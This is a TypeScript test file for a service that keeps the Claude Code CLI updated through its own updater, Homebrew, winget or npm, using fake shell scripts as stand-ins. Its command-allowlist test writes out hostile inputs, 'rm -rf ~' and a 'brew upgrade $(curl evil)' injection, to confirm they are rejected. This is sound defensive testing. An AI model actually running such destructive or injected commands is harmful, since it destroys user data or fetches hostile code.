import {
	chmodSync,
	existsSync,
	mkdirSync,
	mkdtempSync,
	readFileSync,
	rmSync,
	writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { blockedUpdate, ClaudeCodeUpdates, fixCommand } from './claude-code-updates.service';

const roots: string[] = [];

afterEach(() => {
	for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true });
});

function fakeClaude(
	exitCode = 0,
	onUpdate = '',
): { readonly executable: string; calls(): string[] } {
	const root = mkdtempSync(join(tmpdir(), 'malini-claude-updates-'));
	roots.push(root);
	const executable = join(root, 'claude');
	const log = join(root, 'calls.log');
	writeFileSync(
		executable,
		`#!/bin/sh\nsleep 0.1\necho "$CLAUDE_UPDATE_MARK $*" >> "${log}"\n${onUpdate}\nexit ${exitCode}\n`,
	);
	chmodSync(executable, 0o755);
	return {
		executable,
		calls: () => {
			try {
				return readFileSync(log, 'utf8').trim().split('\n');
			} catch {
				return [];
			}
		},
	};
}

describe('ClaudeCodeUpdates', () => {
	it('asks claude to update, with the environment it was given, and never twice at once', async () => {
		const claude = fakeClaude();
		const updates = new ClaudeCodeUpdates({
			executable: () => claude.executable,
			environment: () => ({ CLAUDE_UPDATE_MARK: 'mark' }),
		});

		await Promise.all([updates.check(), updates.check()]);

		expect(claude.calls()).toEqual(['mark update']);
		await updates.check();
		expect(claude.calls()).toEqual(['mark update', 'mark update']);
	});

	it('reports an update only when claude replaced itself, and tells the next ask once', async () => {
		const unchanged = fakeClaude();
		const replaced = fakeClaude(
			0,
			'cp "$0" "$0.next" && echo "# 2.0.0" >> "$0.next" && mv "$0.next" "$0"',
		);

		expect(
			await new ClaudeCodeUpdates({
				executable: () => unchanged.executable,
				environment: () => ({}),
			}).check(),
		).toBe(false);
		const updates = new ClaudeCodeUpdates({
			executable: () => replaced.executable,
			environment: () => ({}),
		});
		expect(await updates.check()).toBe(true);
		expect(readFileSync(replaced.executable, 'utf8')).toContain('# 2.0.0');
		expect(await updates.checkIfStale()).toEqual({ updated: true, failed: null });
		expect(await updates.checkIfStale()).toEqual({ updated: false, failed: null });
	});

	it('keeps going when claude is missing or the update fails', async () => {
		const failing = fakeClaude(1);

		await expect(
			new ClaudeCodeUpdates({ executable: () => null, environment: () => ({}) }).check(),
		).resolves.toBe(false);
		await expect(
			new ClaudeCodeUpdates({
				executable: () => failing.executable,
				environment: () => ({}),
			}).check(),
		).resolves.toBe(false);
		await expect(
			new ClaudeCodeUpdates({
				executable: () => '/nowhere/claude',
				environment: () => ({}),
			}).check(),
		).resolves.toBe(false);
	});

	it('checks again only once the last check is old, and joins one that runs', async () => {
		const claude = fakeClaude();
		const updates = new ClaudeCodeUpdates({
			executable: () => claude.executable,
			environment: () => ({ CLAUDE_UPDATE_MARK: 'mark' }),
			recheckAfterMs: 1_000,
		});

		await Promise.all([updates.check(), updates.checkIfStale()]);
		expect(claude.calls()).toEqual(['mark update']);
		expect((await updates.checkIfStale()).updated).toBe(false);
		expect(claude.calls()).toEqual(['mark update']);
		await updates.checkIfStale(true);
		expect(claude.calls()).toEqual(['mark update', 'mark update']);

		await new Promise((resolve) => setTimeout(resolve, 1_000));
		await updates.checkIfStale();
		expect(claude.calls()).toEqual(['mark update', 'mark update', 'mark update']);
	});

	it('reports an update that something else made, such as brew upgrade, at the next ask', async () => {
		const claude = fakeClaude();
		const updates = new ClaudeCodeUpdates({
			executable: () => claude.executable,
			environment: () => ({ CLAUDE_UPDATE_MARK: 'mark' }),
		});

		expect(await updates.check()).toBe(false);
		expect((await updates.checkIfStale()).updated).toBe(false);
		writeFileSync(claude.executable, `${readFileSync(claude.executable, 'utf8')}# 2.0.0\n`);

		expect((await updates.checkIfStale()).updated).toBe(true);
		expect(claude.calls()).toEqual(['mark update', 'mark update']);
	});

	it('runs the upgrade Homebrew asks for, and keeps the version only while it fails', async () => {
		const root = mkdtempSync(join(tmpdir(), 'malini-claude-homebrew-'));
		roots.push(root);
		const bin = join(root, 'bin');
		const claude = join(bin, 'claude');
		const brewLog = join(root, 'brew.log');
		const brewFails = join(root, 'brew-fails');
		mkdirSync(bin);
		writeFileSync(join(root, 'update.txt'), HOMEBREW_UPDATE_AVAILABLE);
		writeFileSync(claude, `#!/bin/sh\ncat "${join(root, 'update.txt')}"\n`);
		writeFileSync(
			join(bin, 'brew'),
			[
				'#!/bin/sh',
				`echo "$*" >> "${brewLog}"`,
				`[ -f "${brewFails}" ] && { echo "Error: Download failed" >&2; exit 1; }`,
				`printf '#!/bin/sh\\necho "Claude is up to date!"\\n' > "${claude}.next" && chmod +x "${claude}.next" && mv "${claude}.next" "${claude}"`,
			].join('\n'),
		);
		chmodSync(claude, 0o755);
		chmodSync(join(bin, 'brew'), 0o755);
		writeFileSync(brewFails, '');
		const updates = new ClaudeCodeUpdates({
			executable: () => claude,
			environment: () => ({ PATH: `${bin}:/usr/bin:/bin` }),
		});

		expect(await updates.checkIfStale()).toEqual({
			updated: false,
			failed: { version: '2.1.311' },
		});

		rmSync(brewFails);
		expect(await updates.checkIfStale(true)).toEqual({ updated: true, failed: null });
		expect(readFileSync(brewLog, 'utf8')).toBe('upgrade claude-code\nupgrade claude-code\n');
		expect(await updates.checkIfStale(true)).toEqual({ updated: false, failed: null });
	});

	it('moves a read-only npm install to the native one', async () => {
		const root = mkdtempSync(join(tmpdir(), 'malini-claude-npm-'));
		roots.push(root);
		const npm = join(root, 'npm', 'claude');
		const native = join(root, 'native', 'claude');
		mkdirSync(join(root, 'npm'));
		writeFileSync(join(root, 'stdout.txt'), NPM_READ_ONLY_STDOUT);
		writeFileSync(join(root, 'stderr.txt'), NPM_READ_ONLY_STDERR);
		writeFileSync(
			npm,
			[
				'#!/bin/sh',
				`if [ "$1" = install ]; then mkdir -p "${join(root, 'native')}" && printf '#!/bin/sh\\n' > "${native}" && chmod +x "${native}"; exit 0; fi`,
				`cat "${join(root, 'stdout.txt')}"`,
				`cat "${join(root, 'stderr.txt')}" >&2`,
				'exit 1',
			].join('\n'),
		);
		chmodSync(npm, 0o755);
		const updates = new ClaudeCodeUpdates({
			executable: () => (existsSync(native) ? native : npm),
			environment: () => ({}),
		});

		expect(await updates.checkIfStale()).toEqual({ updated: true, failed: null });
		expect(existsSync(native)).toBe(true);
	});

	it('updates when it starts and again on every interval, until it stops', async () => {
		const claude = fakeClaude();
		const updates = new ClaudeCodeUpdates({
			executable: () => claude.executable,
			environment: () => ({ CLAUDE_UPDATE_MARK: 'mark' }),
			intervalMs: 300,
		});

		updates.start();
		updates.start();
		await waitFor(() => claude.calls().length >= 2);
		updates.stop();
		const stopped = claude.calls().length;
		await new Promise((resolve) => setTimeout(resolve, 500));

		expect(claude.calls().length).toBe(stopped);
	});
});

describe('blockedUpdate', () => {
	const ran = (stdout: string, stderr = '', exitCode = 0) => ({
		exitCode,
		timedOut: false,
		stdout,
		stderr,
	});

	it('reads the command a package manager wants', () => {
		expect(blockedUpdate(ran(HOMEBREW_UPDATE_AVAILABLE))).toEqual({
			version: '2.1.311',
			command: 'brew upgrade claude-code',
		});
		expect(
			blockedUpdate(
				ran(
					'Claude is managed by winget.\nUpdate available: 2.1.293 → 2.1.311\nTo update, run:\n  \u001b[1mwinget upgrade Anthropic.ClaudeCode\u001b[22m\n',
				),
			),
		).toEqual({
			version: '2.1.311',
			command: 'winget upgrade Anthropic.ClaudeCode',
		});
	});

	it('sends a read-only npm install to the native installer', () => {
		expect(blockedUpdate(ran(NPM_READ_ONLY_STDOUT, NPM_READ_ONLY_STDERR, 1))).toEqual({
			version: '2.1.322',
			command: 'claude install',
		});
	});

	it('finds nothing to show when claude is current, updated, or could not tell', () => {
		expect(
			blockedUpdate(ran('Claude is managed by Homebrew.\nClaude is up to date!\n')),
		).toBeNull();
		expect(
			blockedUpdate(
				ran(
					'Claude is managed by Homebrew.\nCould not check for updates (network check skipped or unavailable).\nTo update manually, run:\n  brew upgrade claude-code\n',
				),
			),
		).toBeNull();
		expect(blockedUpdate(ran('Successfully updated from 2.1.293 to version 2.1.322\n'))).toBeNull();
		expect(blockedUpdate(ran('', 'Error: Failed to install native update\n', 1))).toBeNull();
	});
});

describe('fixCommand', () => {
	it('runs only a package manager or claude install, word by word', () => {
		expect(fixCommand('brew upgrade claude-code@latest', '/bin/claude')).toEqual([
			'brew',
			['upgrade', 'claude-code@latest'],
		]);
		expect(fixCommand('winget upgrade Anthropic.ClaudeCode', '/bin/claude')).toEqual([
			'winget',
			['upgrade', 'Anthropic.ClaudeCode'],
		]);
		expect(fixCommand('claude install', '/opt/npm/bin/claude')).toEqual([
			'/opt/npm/bin/claude',
			['install'],
		]);
		expect(fixCommand('claude update --force', '/bin/claude')).toBeNull();
		expect(fixCommand('rm -rf ~', '/bin/claude')).toBeNull();
		expect(fixCommand('brew upgrade $(curl evil)', '/bin/claude')).toBeNull();
		expect(fixCommand('cd ~/.claude/local && npm update', '/bin/claude')).toBeNull();
	});
});

const HOMEBREW_UPDATE_AVAILABLE = `Current version: 2.1.293
Checking for updates to stable version...

Claude is managed by Homebrew.
Update available: 2.1.293 → 2.1.311

To update, run:
  brew upgrade claude-code

Tip: For more frequent updates, use the claude-code@latest cask:
  brew uninstall --cask claude-code && brew install --cask claude-code@latest
`;

const NPM_READ_ONLY_STDOUT = `Current version: 2.1.293
Checking for updates to latest version...

Warning: Can't auto-update: npm global folder isn't writable
Fix: Run claude install to switch to the native installer (no sudo)
Or reinstall with a sudo-free npm (e.g. via nvm)
Or npm config set prefix ~/.npm-global, add ~/.npm-global/bin to PATH, then reinstall
New version available: 2.1.322 (current: 2.1.293)
Installing update...
Using global installation update method...
`;

const NPM_READ_ONLY_STDERR = `Error: Insufficient permissions to install update
Try running with sudo or fix npm permissions
Or consider using native installation with: claude install
`;

async function waitFor(done: () => boolean): Promise<void> {
	const deadline = Date.now() + 5_000;
	while (!done()) {
		if (Date.now() > deadline) throw new Error('timed out');
		await new Promise((resolve) => setTimeout(resolve, 20));
	}
}
